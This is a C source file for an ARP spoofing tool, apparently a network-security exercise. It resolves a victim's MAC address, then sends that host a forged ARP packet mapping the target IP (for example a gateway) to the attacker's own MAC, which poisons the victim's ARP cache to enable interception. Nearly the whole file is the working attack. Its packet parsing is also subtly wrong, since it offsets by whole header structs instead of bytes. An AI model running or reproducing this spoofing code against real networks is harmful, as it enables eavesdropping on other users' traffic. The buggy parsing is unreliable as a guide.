#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <netinet/ether.h>

#include "pcap_handle.h"
#include "pcap_lib.h"

void usage() {
  printf("syntax: send_arp <interface> <sender IP> <target IP>\n");
  printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  uint32_t sender_ip;
  str_to_ip(argv[2], &sender_ip);
  uint32_t target_ip;
  str_to_ip(argv[3], &target_ip);

  // get my ip and my mac
  uint32_t my_ip;
  MAC my_mac;
  s_getIpAddress (dev, (unsigned char*)&my_ip);
  mac_eth0(dev, (unsigned char*)&my_mac);
  print_IP("my IP", my_ip);
  print_MAC("my MAC", my_mac);

  // broadcast arp request (which mac has target_ip?)
  MAC broadcast;
  memset(&broadcast, '\xFF', 6);
  send_arp(my_mac, my_ip, broadcast, sender_ip, ARPOP_REQUEST);
  printf("send broadcast ARP request\n");

  // wait for the response
  ARP_header * arp_pkt;
  while (true) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
    
    if(ntohs(((Eth_header*)packet)->ether_type) != ETHERTYPE_ARP) continue;
    arp_pkt = (ARP_header*)packet + 0xC;

    if(arp_pkt->sender_addr == sender_ip && arp_pkt->opcode == ARPOP_REPLY) break;
  }
  MAC sender_mac;
  memcpy(&sender_mac, &(arp_pkt->sender_mac), 6);
  printf("ARP reply received\n");
  print_IP("sender IP", sender_ip);
  print_MAC("sender MAC", sender_mac);

  // send arp
  send_arp(my_mac, target_ip, sender_mac, sender_ip, ARPOP_REQUEST);
  printf("ARP request sent\n");

  pcap_close(handle);
  return 0;
}
